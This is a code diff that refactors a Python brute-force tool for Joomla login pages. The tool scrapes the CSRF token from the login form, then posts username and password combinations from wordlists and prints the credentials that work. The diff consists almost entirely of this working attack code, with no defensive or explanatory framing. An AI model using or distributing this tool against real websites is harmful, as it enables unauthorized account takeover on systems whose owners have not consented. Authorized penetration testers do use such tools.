@@ -20,7 +20,7 @@ class Joomla():
     def __init__(self):
         self.initializeVariables()
         self.sendrequest()
-    
+
     def initializeVariables(self):
         #Initialize args
         parser = argparse.ArgumentParser(description='Joomla login bruteforce')
@@ -66,43 +66,38 @@ class Joomla():
     def sendrequest(self):
         if self.userlist:
             for user in self.getdata(self.userlist):
-                user=user.decode('utf-8')
-                
-                for password in self.getdata(self.wordlistfile):
-                    #first GET for CSSRF token
-                    r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies)
-                    soup = BeautifulSoup(r.text, 'html.parser')
-                    longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
-                    password=password.decode('utf-8')
-                    data = {
-                        'username' : user,
-                        'passwd' : password,
-                        'option' : self.option,
-                        'task' : self.task,
-                        'return' : self.ret,
-                        longstring : 1
-                    }
-                    r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies)
-                    soup = BeautifulSoup(r.text, 'html.parser')
-                    response = soup.find('div', {'class': 'alert-message'})
-
-                    if response:
-                        if self.verbose:
-                            print(f'{bcolors.FAIL} {user}:{password}{bcolors.ENDC}')
-                    else:
-                        print(f'{bcolors.OKGREEN} {user}:{password}{bcolors.ENDC}')
-                        break
+                self.username=user.decode('utf-8')
+                self.doGET()
         else:
-            None
-    
-    
-    @staticmethod
-    def doGET(username, password):
-        
-    
+            self.doGET()
+
+    def doGET(self):
+        for password in self.getdata(self.wordlistfile):
+            #CSSRF
+            r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies)
+            soup = BeautifulSoup(r.text, 'html.parser')
+            longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
+            password=password.decode('utf-8')
+            data = {
+                'username' : self.username,
+                'passwd' : password,
+                'option' : self.option,
+                'task' : self.task,
+                'return' : self.ret,
+                longstring : 1
+            }
+            r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies)
+            soup = BeautifulSoup(r.text, 'html.parser')
+            response = soup.find('div', {'class': 'alert-message'})
+            if response:
+                if self.verbose:
+                    print(f'{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')
+            else:
+                print(f'{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')
+                break
+
     @staticmethod
     def getdata(path):
-        
         with open(path, 'rb+') as f:
             data = ([line.rstrip() for line in f])
             f.close()
